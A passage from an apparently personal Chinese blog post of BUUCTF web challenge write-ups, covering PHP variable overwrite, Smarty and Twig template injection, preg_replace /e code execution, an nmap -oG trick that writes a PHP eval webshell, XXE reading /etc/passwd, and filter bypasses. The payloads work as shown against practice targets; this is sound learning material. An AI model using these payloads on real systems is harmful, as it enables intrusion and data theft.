的值并终止脚本执行    exit($yds); &#125; // 检查 $_POST[&#x27;flag&#x27;] 或 $_GET[&#x27;flag&#x27;] 是否等于字符串 &#x27;flag&#x27; if($_POST[&#x27;flag&#x27;] === &#x27;flag&#x27; || $_GET[&#x27;flag&#x27;] === &#x27;flag&#x27;)&#123;    // 如果其中一个等于 &#x27;flag&#x27;，输出 $is 的值并终止脚本执行    exit($is); &#125; // 最后输出变量 $flag 的值 echo &quot;the flag is: &quot;.$flag; ?&gt;</span></span><br></pre></td></tr></table></figure>

查看源码考察变量覆盖

就是通过为变量赋值另外的一个变量的变量名来进行绕过

?handsome=flag&flag=x&x=flag



[CISCN2019 华东南赛区]Web11

根据内容推测ssrf

<img src="/2025/07/10/buu%E5%88%B7%E9%A2%98/image-20250707103155907.png" class="" title="image-20250707103155907">

更改为本地ip，发现右上角IP地址改变，应该是注入点fuzz识别是什么注入漏洞

应该是ssti模板注入

dirsearch扫描发现是smarty 模板

{system('cat /flag')}

上网查寻可以直接使用system进行rce

<img src="/2025/07/10/buu%E5%88%B7%E9%A2%98/image-20250707153124322.png" class="" title="image-20250707153124322">

# [BJDCTF2020]The mystery of ip

查看ip测试更改本地ip发现会直接回显，测试ssti发现

<img src="/2025/07/10/buu%E5%88%B7%E9%A2%98/image-20250707153942714.png" class="" title="image-20250707153942714">

测试模板类型

<img src="/2025/07/10/buu%E5%88%B7%E9%A2%98/image-20250707154133792.png" class="" title="image-20250707154133792">

发现是smarty

<img src="/2025/07/10/buu%E5%88%B7%E9%A2%98/image-20250707154144518.png" class="" title="image-20250707154144518">

直接使用system进行测试

能够直接执行指令

# [BJDCTF2020]ZJCTF，不过如此

?text=php://input&file=php://filter/convert.base64-encode/resource=next.php

使用input和filter协议阅读next.php文件内容

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;id&#x27;</span>] = <span class="variable">$id</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">complex</span>(<span class="params"><span class="variable">$re</span>, <span class="variable">$str</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(</span><br><span class="line">        <span class="string">&#x27;/(&#x27;</span> . <span class="variable">$re</span> . <span class="string">&#x27;)/ei&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>,</span><br><span class="line">        <span class="variable">$str</span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$re</span> =&gt; <span class="variable">$str</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">complex</span>(<span class="variable">$re</span>, <span class="variable">$str</span>). <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    @<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

查看代码发现需要使用getflag这个函数来进行rce

在php5中preg_replace /e存在漏洞可以进行命令执行

通过\S让其匹配空字符来确定后面可以调用getflag函数来进行rce

\S*={${getFlag()}}&cmd=system('cat /flag');

# [BUUCTF 2018]Online Tool

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>])) &#123;</span><br><span class="line">  <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] = <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;host&#x27;</span>])) &#123;</span><br><span class="line">  <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="variable">$host</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;host&#x27;</span>];</span><br><span class="line">  <span class="variable">$host</span> = <span class="title function_ invoke__">escapeshellarg</span>(<span class="variable">$host</span>);</span><br><span class="line">  <span class="variable">$host</span> = <span class="title function_ invoke__">escapeshellcmd</span>(<span class="variable">$host</span>);</span><br><span class="line">  <span class="variable">$sandbox</span> = <span class="title function_ invoke__">md5</span>(<span class="string">&quot;glzjin&quot;</span>. <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;you are in sandbox &#x27;</span>.<span class="variable">$sandbox</span>;</span><br><span class="line">  @<span class="title function_ invoke__">mkdir</span>(<span class="variable">$sandbox</span>);</span><br><span class="line">  <span class="title function_ invoke__">chdir</span>(<span class="variable">$sandbox</span>);</span><br><span class="line">  <span class="keyword">echo</span> <span class="title function_ invoke__">system</span>(<span class="string">&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;</span>.<span class="variable">$host</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">其使用了</span><br><span class="line"></span><br><span class="line">  <span class="variable">$host</span> = <span class="title function_ invoke__">escapeshellarg</span>(<span class="variable">$host</span>);</span><br><span class="line">  <span class="variable">$host</span> = <span class="title function_ invoke__">escapeshellcmd</span>(<span class="variable">$host</span>);</span><br></pre></td></tr></table></figure>

来避免rce漏洞但是当两者一块使用时反而会触发漏洞

<img src="/2025/07/10/buu%E5%88%B7%E9%A2%98/image-20250707170845298.png" class="" title="image-20250707170845298">

其会对特殊字符进行转义

' <?php @eval($_POST["mayi"]);?><p> -oG mayi.php ‘</p>
<p>利用nmap的参数生成带有一句话木马的文件即可</p>
<h1 id="NCTF2019-Fake-XML-cookbook"><a href="#NCTF2019-Fake-XML-cookbook" class="headerlink" title="[NCTF2019]Fake XML cookbook"></a>[NCTF2019]Fake XML cookbook</h1><p>题目提示xxe注入</p>
<table>
<thead>
<tr>
<th>function doLogin(){</th>
</tr>
</thead>
<tbody><tr>
<td>var username &#x3D; $(“#username”).val();</td>
</tr>
<tr>
<td>var password &#x3D; $(“#password”).val();</td>
</tr>
<tr>
<td>if(username &#x3D;&#x3D; “” || password &#x3D;&#x3D; “”){</td>
</tr>
<tr>
<td>alert(“Please enter the username and password!”);</td>
</tr>
<tr>
<td>return;</td>
</tr>
<tr>
<td>}</td>
</tr>
<tr>
<td></td>
</tr>
<tr>
<td>var data &#x3D; “<user><username>“ + username + “</username><password>“ + password + “</password></user>“;</td>
</tr>
<tr>
<td>$.ajax({</td>
</tr>
<tr>
<td>type: “POST”,</td>
</tr>
<tr>
<td>url: “doLogin.php”,上</td>
</tr>
<tr>
<td>contentType: “application&#x2F;xml;charset&#x3D;utf-8”,</td>
</tr>
<tr>
<td>data: data,</td>
</tr>
<tr>
<td>dataType: “xml”,</td>
</tr>
<tr>
<td>anysc: false,</td>
</tr>
<tr>
<td>success: function (result) {</td>
</tr>
<tr>
<td>var code &#x3D; result.getElementsByTagName(“code”)[0].childNodes[0].nodeValue;</td>
</tr>
<tr>
<td>var msg &#x3D; result.getElementsByTagName(“msg”)[0].childNodes[0].nodeValue;</td>
</tr>
<tr>
<td>if(code &#x3D;&#x3D; “0”){</td>
</tr>
<tr>
<td>$(“.msg”).text(msg + “ login fail!”);</td>
</tr>
<tr>
<td>}else if(code &#x3D;&#x3D; “1”){</td>
</tr>
<tr>
<td>$(“.msg”).text(msg + “ login success!”);</td>
</tr>
<tr>
<td>}else{</td>
</tr>
<tr>
<td>$(“.msg”).text(“error:” + msg);</td>
</tr>
<tr>
<td>}</td>
</tr>
<tr>
<td>},</td>
</tr>
<tr>
<td>error: function (XMLHttpRequest,textStatus,errorThrown) {</td>
</tr>
<tr>
<td>$(“.msg”).text(errorThrown + ‘:’ + textStatus);</td>
</tr>
<tr>
<td>}</td>
</tr>
<tr>
<td>});</td>
</tr>
<tr>
<td>}</td>
</tr>
</tbody></table>
<p>查看源代码通过post将参数传入道doLogin.php之中进行判断</p>
<p>1111使用下述xml进行测试<!DOCTYPE foo [
<!ELEMENT foo ANY ><br><!ENTITY xxe SYSTEM "file:///etc/passwd" >]&gt;<br><foo>&xxe;</foo></p>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" ><p>]&gt;<br><foo>&xxe;</foo></p>
<img src="/2025/07/10/buu%E5%88%B7%E9%A2%98/image-20250707181749696.png" class="" title="image-20250707181749696">

<p>可直接出来数据内容，注意xml的格式在引用时&amp;admin后需要加入；</p>
<p>在xxe注入中需要注意xml文件的格式</p>
<h1 id="BJDCTF2020-Cookie-is-so-stable"><a href="#BJDCTF2020-Cookie-is-so-stable" class="headerlink" title="[BJDCTF2020]Cookie is so stable"></a>[BJDCTF2020]Cookie is so stable</h1><img src="/2025/07/10/buu%E5%88%B7%E9%A2%98/image-20250707182448806.png" class="" title="image-20250707182448806">

<p>存在注入点，输入什么回显什么</p>
<p>测试为ssti注入</p>
<p>通过进一步测试发现为jwit模板注入</p>
<p>使用常用payload进行注入，成功执行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;cat /flag&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>



<h1 id="VNCTF2023-象棋王子、"><a href="#VNCTF2023-象棋王子、" class="headerlink" title="[VNCTF2023]象棋王子、"></a>[VNCTF2023]象棋王子、</h1><p>在源码里发现了js混淆的代码</p>
<p>该内容能直接执行故丢到控制台去看看成功获取flag</p>
<h1 id="网鼎杯-2020-朱雀组-Nmap"><a href="#网鼎杯-2020-朱雀组-Nmap" class="headerlink" title="[网鼎杯 2020 朱雀组]Nmap"></a>[网鼎杯 2020 朱雀组]Nmap</h1><p>该题目与前面的</p>
<p>[BUUCTF 2018]Online Tool很像利用nmap的-og参数将木马写入文件内，不过该题目队对php有个过滤使用以下payload即可</p>
<p>127.0.0.1 | ‘ <?=@eval($_POST["cmd"]);?> -oG shell.phtml ‘</p>
<img src="/2025/07/10/buu%E5%88%B7%E9%A2%98/image-20250709114156059.png" class="" title="image-20250709114156059">

<h1 id="RoarCTF-2019-Easy-Java"><a href="#RoarCTF-2019-Easy-Java" class="headerlink" title="[RoarCTF 2019]Easy Java"></a>[RoarCTF 2019]Easy Java</h1><p>前置知识：</p>
<p>WEB-INF是java的WEB应用的安全目录。</p>
<p>1.WEB-INF&#x2F;web.xml</p>
<p>web应用程序配置文件，描述了servlet和其他的应用组件配置及命名规则。</p>
<p>2.WEB-INF&#x2F;classes</p>
<p>包含了站点所有用的class文件，包括servlet class和非servlet class</p>
<p>3.WEB-INF&#x2F;lib</p>
<p>存放web应用需要的JAR文件</p>
<p>4.WEB-INF&#x2F;src</p>
<p>源码目录，按照包名结构放置各个java文件</p>
<p>5.WEB-INF&#x2F;database.properties</p>
<p>数据库配置文件</p>
<p>6.WEB-INF&#x2F;tags</p>
<p>存放了自定义标签文件</p>
<p>7.WEB-INF&#x2F;jsp</p>
<p>jsp 1.2 一下版本的文件存放位置。</p>
<p>8.WEB-INF&#x2F;jsp2</p>
<p>存放jsp2.0以下版本的文件。</p>
<p>9.META-INF</p>
<p>相当于一个信息包。</p>
<p>Tomcat的WEB-INF目录，每个j2ee的web应用部署文件默认包含这个目录。</p>
<p>Nginx在映射静态文件时，把WEB-INF目录映射进去，而又没有做Nginx的相关安全配置（或Nginx自身一些缺陷影响）。从而导致通过Nginx访问到Tomcat的WEB-INF目录（请注意这里，是通过Nginx，而不是Tomcat访问到的，因为上面已经说到，Tomcat是禁止访问这个目录的。）。</p>
<p>直接在域名后面加上WEB-INF&#x2F;web.xml就可以了</p>
<p>当攻击者通过传入恶意的<code>name</code>参数值为<code>WEB-INF/web.xml</code>时可以读取Web应用的配置信息</p>
<p>相当于一个文件任意读取</p>
<img src="/2025/07/10/buu%E5%88%B7%E9%A2%98/image-20250709151517513.png" class="" title="image-20250709151517513">

<h1 id="WesternCTF2018-shrine"><a href="#WesternCTF2018-shrine" class="headerlink" title="[WesternCTF2018]shrine"></a>[WesternCTF2018]shrine</h1><h1 id="2021DASCTF实战精英夏令营暨DASCTF-July-X-CBCTF-4th-cat-flag"><a href="#2021DASCTF实战精英夏令营暨DASCTF-July-X-CBCTF-4th-cat-flag" class="headerlink" title="[2021DASCTF实战精英夏令营暨DASCTF July X CBCTF 4th]cat flag"></a>[2021DASCTF实战精英夏令营暨DASCTF July X CBCTF 4th]cat flag</h1><p>根据提示管理员访问过flag那就寻找日志文件</p>
<p>?<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=cmd&spm=1001.2101.3001.7020">cmd</a>&#x3D;&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log</p>
<p>发先flag文件但是有过滤</p>
<p>然后就是想办法绕过escapeshellarg</p>
<p>由于escapeshellarg并不会检测或移除“不可见字符”所以使用以下payload即可</p>
<p>?cmd&#x3D;this_is_final_fl%ffag_e2a457126032b42d.php</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://www.zmrz.xyz">ZmRz</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://www.zmrz.xyz/2025/07/10/buu%E5%88%B7%E9%A2%98/">https://www.zmrz.xyz/2025/07/10/buu%E5%88%B7%E9%A2%98/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://www.zmrz.xyz" target="_blank">ZmRzのblog</a>！</span></div></div><div class="tag_share"><div class="post-share"><div class="social-share" data-image="/images/covers/%E3%80%90%E5%93%B2%E9%A3%8E%E5%A3%81%E7%BA%B8%E3%80%91%E5%89%91-%E5%8F%A4%E9%A3%8E-%E5%BE%A1%E5%89%91%E9%A9%AD%E9%BE%99.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/2025/03/13/upload-labs/" title="upload-labs"><img class="cover" src="/images/covers/%E3%80%90%E5%93%B2%E9%A3%8E%E5%A3%81%E7%BA%B8%E3%80%91%E5%8A%A8%E6%BC%AB%E5%A5%B3%E5%AD%A9-%E5%8F%AF%E7%88%B1.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">upload-labs</div></div><div class="info-2"><div class="info-item-1">upload-labs靶场（由于版本的问题该靶场要使用php5等后缀名不能使用nts版的php最简单方法使用老版本phpstudy，第十二和第十三关的php版本要求在5.3以下且magic_quotes_gpc为关闭状态（需要自己关闭）） 第一关第一关中直接上传php文件发现其只能上传jpg png gif这种图片文件 并发现在上传操作时无法对其进行抓包所以确定其为前端验证   将一句话木马文件后缀改为jpg进行上传并进行抓包处理   使用bp抓包并将文件后缀改为php后发现成功上传文件 使用蚁剑进行连接，成功连接木马   第二关第二关发现其并不是前端验证   但直接bp抓包修改后缀名即可成功上传木马，之后使用蚁剑连接即可 第三关上传php文件后发现其设置了黑名单   不允许上传php文件，故抓包将php文件后缀改为php5进行尝试 进行多次尝试发现新版phpstudy默认下载的php版本有问题故而将版本退回2016进行尝试实验成功，原因是因为新版phpstudy下载的php版本均为nts版配置文件中无法更改识别内容故将其退回2016版本即可 详细内容参考该文章关于PHPStud...</div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/images/avatar.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">ZmRz</div><div class="author-info-description">总有人间一两风,填我十万八千梦</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">4</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">3</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-UnserializeOne"><span class="toc-number">1.</span> <span class="toc-text">[NewStarCTF 公开赛赛道]UnserializeOne</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#NewStarCTF-2023-%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-R-C-E"><span class="toc-number">2.</span> <span class="toc-text">[NewStarCTF 2023 公开赛道]R!C!E!</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#NewStarCTF-2023-%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-EasyLogin"><span class="toc-number">3.</span> <span class="toc-text">[NewStarCTF 2023 公开赛道]EasyLogin</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#NewStarCTF-2023-%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-Begin-of-HTTP"><span class="toc-number">4.</span> <span class="toc-text">[NewStarCTF 2023 公开赛道]Begin of HTTP</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#NewStarCTF-2023-%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-Begin-of-Upload"><span class="toc-number">5.</span> <span class="toc-text">[NewStarCTF 2023 公开赛道]Begin of Upload</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">5.0.1.</span> <span class="toc-text"></span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#NewStarCTF-2023-%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-Begin-of-PHP"><span class="toc-number">6.</span> <span class="toc-text">[NewStarCTF 2023 公开赛道]Begin of PHP</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#NewStarCTF-2023-%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-%E6%B3%84%E6%BC%8F%E7%9A%84%E7%A7%98%E5%AF%86"><span class="toc-number">7.</span> <span class="toc-text">[NewStarCTF 2023 公开赛道]泄漏的秘密</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#NewStarCTF-2023-%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-ez-sql"><span class="toc-number">8.</span> <span class="toc-text">[NewStarCTF 2023 公开赛道]ez_sql</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#NewStarCTF-2023-%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-Upload-again"><span class="toc-number">9.</span> <span class="toc-text">[NewStarCTF 2023 公开赛道]Upload again!</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#NewStarCTF-2023-%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-%E6%B8%B8%E6%88%8F%E9%AB%98%E6%89%8B"><span class="toc-number">10.</span> <span class="toc-text">[NewStarCTF 2023 公开赛道]游戏高手</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#NewStarCTF-2023-%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-Include-%F0%9F%8D%90"><span class="toc-number">11.</span> <span class="toc-text">[NewStarCTF 2023 公开赛道]Include 🍐</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#NewStarCTF-2023-%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-R-C-E-1"><span class="toc-number">12.</span> <span class="toc-text">[NewStarCTF 2023 公开赛道]R!!C!!E!!</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#NewStarCTF-2023-%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-Unserialize%EF%BC%9F"><span class="toc-number">13.</span> <span class="toc-text">[NewStarCTF 2023 公开赛道]Unserialize？</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#NewStarCTF-2023-%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-R-C-E-2"><span class="toc-number">14.</span> <span class="toc-text">[NewStarCTF 2023 公开赛道]R!!!C!!!E!!!</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#NewStarCTF-2023-%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-POP-Gadget"><span class="toc-number">15.</span> <span class="toc-text">[NewStarCTF 2023 公开赛道]POP Gadget</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#NewStarCTF-2023-%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-More-Fast"><span class="toc-number">16.</span> <span class="toc-text">[NewStarCTF 2023 公开赛道]More Fast</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#NewStarCTF-2023-%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-%E9%80%83"><span class="toc-number">17.</span> <span class="toc-text">[NewStarCTF 2023 公开赛道]逃</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#NCTF2019-Fake-XML-cookbook"><span class="toc-number">18.</span> <span class="toc-text">[NCTF2019]Fake XML cookbook</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#BJDCTF2020-Cookie-is-so-stable"><span class="toc-number">19.</span> <span class="toc-text">[BJDCTF2020]Cookie is so stable</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#VNCTF2023-%E8%B1%A1%E6%A3%8B%E7%8E%8B%E5%AD%90%E3%80%81"><span class="toc-number">20.</span> <span class="toc-text">[VNCTF2023]象棋王子、</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E6%9C%B1%E9%9B%80%E7%BB%84-Nmap"><span class="toc-number">21.</span> <span class="toc-text">[网鼎杯 2020 朱雀组]Nmap</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#RoarCTF-2019-Easy-Java"><span class="toc-number">22.</span> <span class="toc-text">[RoarCTF 2019]Easy Java</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#WesternCTF2018-shrine"><span class="toc-number">23.</span> <span class="toc-text">[WesternCTF2018]shrine</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2021DASCTF%E5%AE%9E%E6%88%98%E7%B2%BE%E8%8B%B1%E5%A4%8F%E4%BB%A4%E8%90%A5%E6%9A%A8DASCTF-July-X-CBCTF-4th-cat-flag"><span class="toc-number">24.</span> <span class="toc-text">[2021DASCTF实战精英夏令营暨DASCTF July X CBCTF 4th]cat flag</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2025/07/10/buu%E5%88%B7%E9%A2%98/" title="buu刷题"><img src="/images/covers/%E3%80%90%E5%93%B2%E9%A3%8E%E5%A3%81%E7%BA%B8%E3%80%91%E5%89%91-%E5%8F%A4%E9%A3%8E-%E5%BE%A1%E5%89%91%E9%A9%AD%E9%BE%99.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="buu刷题"/></a><div class="content"><a class="title" href="/2025/07/10/buu%E5%88%B7%E9%A2%98/" title="buu刷题">buu刷题</a><time datetime="2025-07-10T11:51:44.000Z" title="发表于 2025-07-10 19:51:44">2025-07-10</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/03/13/upload-labs/" title="upload-labs"><img src="/images/covers/%E3%80%90%E5%93%B2%E9%A3%8E%E5%A3%81%E7%BA%B8%E3%80%91%E5%8A%A8%E6%BC%AB%E5%A5%B3%E5%AD%A9-%E5%8F%AF%E7%88%B1.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="upload-labs"/></a><div class="content"><a class="title" href="/2025/03/13/upload-labs/" title="upload-labs">upload-labs</a><time datetime="2025-03-13T01:19:54.000Z" title="发表于 2025-03-13 09:19:54">2025-03-13</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/03/12/upload%E7%9F%A5%E8%AF%86%E7%82%B9/" title="upload知识点"><img src="/images/covers/090950gnrvQ.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="upload知识点"/></a><div class="content"><a class="title" href="/2025/03/12/upload%E7%9F%A5%E8%AF%86%E7%82%B9/" title="upload知识点">upload知识点</a><time datetime="2025-03-12T13:03:35.000Z" title="发表于 2025-03-12 21:03:35">2025-03-12</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/11/11/sql%E6%B3%A8%E5%85%A5/" title="sql注入"><img src="/images/covers/082813gxSbT.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="sql注入"/></a><div class="content"><a class="title" href="/2024/11/11/sql%E6%B3%A8%E5%85%A5/" title="sql注入">sql注入</a><time datetime="2024-11-10T16:44:06.000Z" title="发表于 2024-11-11 00:44:06">2024-11-11</time></div></div></div></div></div></div></main><footer id="footer"></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script src="/js/fish.js"></script><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-nest.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>